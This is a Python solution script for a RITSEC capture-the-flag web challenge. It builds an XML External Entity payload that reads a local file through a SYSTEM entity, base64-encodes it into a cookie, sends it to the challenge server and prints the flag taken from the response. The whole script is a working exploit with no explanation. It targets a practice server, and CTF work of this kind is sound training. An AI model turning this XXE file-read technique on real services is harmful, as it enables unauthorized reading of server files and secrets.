import base64
import requests
from bs4 import BeautifulSoup

xml="<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://flag\"> ]><input><xmen>&xxe;</xmen></input>"
xml_bytes = xml.encode('ascii')
xml_base64_bytes = base64.b64encode(xml_bytes)
xml_base64_message = xml_base64_bytes.decode('ascii')
cookie={"xmen":xml_base64_message}

response=requests.get("https://xmen-lore-web.challenges.ctf.ritsec.club/xmen",cookies=cookie)
soup = BeautifulSoup(response.text, 'html.parser')
flag_element=soup.find('h1')
flag=flag_element.get_text()
print(flag[:len(flag)-1])
